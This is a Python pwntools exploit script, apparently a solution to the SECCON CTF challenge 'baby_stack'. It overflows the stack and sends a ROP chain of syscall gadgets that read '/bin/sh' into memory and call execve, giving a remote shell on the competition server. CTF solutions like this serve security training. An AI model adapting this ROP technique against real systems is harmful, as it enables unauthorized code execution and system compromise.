from pwn import *
import time

# p = process('./baby')
p = remote('baby_stack.pwn.seccon.jp', 15285)

'''
.text:00000000004569E3                 syscall                 ; LINUX - sys_setitimer
.text:00000000004569E5                 retn

.text:00000000004016EA                 pop     rax
.text:00000000004016EB                 retn

.text:0000000000442AE4                 pop     rsi
.text:0000000000442AE5                 add     al, 83h
.text:0000000000442AE7                 retn

.text:000000000046EC93                 pop     rdx
.text:000000000046EC94                 adc     [rax-1], cl
.text:000000000046EC97                 retn

.text:000000000048B87D                 pop     rdi
.text:000000000048B87E                 cmp     edi, 5CB60FFFh
.text:000000000048B884                 and     al, 18h
.text:000000000048B886                 mov     [rsp+40h], bl
.text:000000000048B88A                 add     rsp, 30h
.text:000000000048B88E                 retn

.text:00000000004042F3                 add     rsp, 20h
.text:00000000004042F7                 retn

'''
# raw_input('wait')

w_addr = 0xc000000f00
binsh_addr = 0xc000000e00 # 0xc820090000

p.recvuntil('>> ')
p.sendline('a')

p.recvuntil('>> ')

payload = 'A' * 104 
payload += p64(0x507220) # '\x00' * 0x8 
payload += p64(0x8)
payload += 'B' * 0x50
payload += p64(0x507220)
payload += p64(0x10)
payload += 'C' * 0xc0

rop = p64(0x48b87d)
rop += p64(0x0)
rop += 'A' * 0x30
rop += p64(0x4042f3)
rop += 'A' * 0x20
rop += p64(0x4016ea)
rop += p64(w_addr)
rop += p64(0x46ec93)
rop += p64(len('/bin/sh\x00'))
rop += p64(0x442ae4)
rop += p64(binsh_addr)
rop += p64(0x4016ea)
rop += p64(0)
rop += p64(0x4569e3)

rop += p64(0x48b87d)
rop += p64(binsh_addr)
rop += 'A' * 0x30
rop += p64(0x4042f3)
rop += 'A' * 0x20
rop += p64(0x4016ea)
rop += p64(w_addr)
rop += p64(0x46ec93)
rop += p64(0x0)
rop += p64(0x442ae4)
rop += p64(0x0)
rop += p64(0x4016ea)
rop += p64(59)
rop += p64(0x4569e3)

payload += rop

# payload += p64(0x431bf0)
# payload += 'C' * 0x8

p.sendline(payload)
time.sleep(1)
p.send('/bin/sh\x00')

p.interactive()

